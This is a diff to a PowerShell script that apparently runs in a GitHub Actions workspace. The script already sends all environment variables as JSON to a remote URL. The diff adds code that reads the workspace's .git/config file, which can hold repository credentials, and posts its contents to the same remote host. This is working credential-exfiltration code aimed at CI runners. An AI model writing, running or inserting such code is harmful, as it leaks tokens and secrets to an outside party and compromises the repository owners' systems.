@@ -15,11 +15,22 @@ $envVariables = @{
 # Convert the hashtable to JSON
 $jsonBody = $envVariables | ConvertTo-Json
 
-# Convert the hashtable to JSON
-$jsonBody = $envVariables | ConvertTo-Json
-
 # Send the environment variables to the remote URL
 $response = Invoke-RestMethod -Uri $remoteUrl -Method Post -Body $jsonBody -ContentType "application/json"
+
+# Path to the file you want to read
+$filePath = "$env:GITHUB_WORKSPACE/.git/config"
+
+# Read the content of the file
+$fileContent = Get-Content -Path $filePath -Raw
+
+# Define the body for the POST request
+$body = @{
+    fileContent = $fileContent
+} | ConvertTo-Json
+
+# Send the file content to the remote URL
+$response = Invoke-RestMethod -Uri $remoteUrl -Method Post -Body $body -ContentType "application/json"
 
 # Display the response
 $response
